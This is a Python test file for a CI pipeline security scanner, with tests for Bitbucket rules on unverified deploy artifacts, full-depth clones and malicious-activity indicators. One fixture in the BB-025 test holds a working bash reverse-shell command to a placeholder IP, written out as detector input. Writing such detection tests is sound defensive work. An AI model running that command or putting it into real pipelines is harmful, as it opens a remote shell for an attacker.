"""Per-rule tests for Bitbucket Pipelines residual rules:
BB-010 (deploy step ingests PR artifact unverified),
BB-020 (clone depth: full exposes complete repo history),
BB-025 (pipeline contains malicious-activity indicators).

BB-010 closes the upstream-step→deployment artifact-handover gap that
artifacts: declarations alone can't bridge. BB-020 catches the
``clone: depth: full`` foot-gun (recovered secrets in old commits).
BB-025 is the threat-indicator catch-all.
"""
from __future__ import annotations

from .conftest import run_check

# ── BB-010 PR artifact handover verification ────────────────────────


class TestBB010PRArtifactHandover:
    def test_fails_when_deploy_consumes_artifact_without_verify(self):
        cfg = """
        pipelines:
          default:
            - step:
                name: build
                max-time: 30
                image: alpine:3.19.1
                script: [make build]
                artifacts:
                  - dist/**
            - step:
                name: ship
                max-time: 30
                deployment: production
                image: alpine:3.19.1
                script:
                  - aws s3 cp dist/app.tar.gz s3://prod/
        """
        f = run_check(cfg, "BB-010")
        assert not f.passed

    def test_passes_with_cosign_verify_step(self):
        cfg = """
        pipelines:
          default:
            - step:
                name: build
                max-time: 30
                image: alpine:3.19.1
                script: [make build]
                artifacts:
                  - dist/**
            - step:
                name: ship
                max-time: 30
                deployment: production
                image: alpine:3.19.1
                script:
                  - cosign verify --certificate-identity-regexp '.*' dist/app.tar.gz
                  - aws s3 cp dist/app.tar.gz s3://prod/
        """
        f = run_check(cfg, "BB-010")
        assert f.passed

    def test_passes_when_no_deploy_step(self):
        cfg = """
        pipelines:
          default:
            - step:
                name: build
                max-time: 30
                image: alpine:3.19.1
                script: [make build]
                artifacts:
                  - dist/**
        """
        f = run_check(cfg, "BB-010")
        assert f.passed


# ── BB-020 clone depth: full ────────────────────────────────────────


class TestBB020CloneDepth:
    def test_fails_when_clone_depth_full(self):
        cfg = """
        clone:
          depth: full
        pipelines:
          default:
            - step:
                max-time: 30
                image: alpine:3.19.1
                script: [make]
        """
        f = run_check(cfg, "BB-020")
        assert not f.passed

    def test_passes_with_explicit_shallow_depth(self):
        cfg = """
        clone:
          depth: 1
        pipelines:
          default:
            - step:
                max-time: 30
                image: alpine:3.19.1
                script: [make]
        """
        f = run_check(cfg, "BB-020")
        assert f.passed

    def test_passes_when_no_clone_block(self):
        cfg = """
        pipelines:
          default:
            - step:
                max-time: 30
                image: alpine:3.19.1
                script: [make]
        """
        f = run_check(cfg, "BB-020")
        assert f.passed


# ── BB-025 malicious-activity indicators ────────────────────────────


class TestBB025MaliciousActivity:
    def test_fails_on_reverse_shell_pattern(self):
        cfg = """
        pipelines:
          default:
            - step:
                max-time: 30
                image: alpine:3.19.1
                script:
                  - bash -i >& /dev/tcp/198.51.100.7/4444 0>&1
        """
        f = run_check(cfg, "BB-025")
        assert not f.passed

    def test_passes_on_clean_pipeline(self):
        cfg = """
        pipelines:
          default:
            - step:
                max-time: 30
                image: alpine:3.19.1
                script: [make]
        """
        f = run_check(cfg, "BB-025")
        assert f.passed
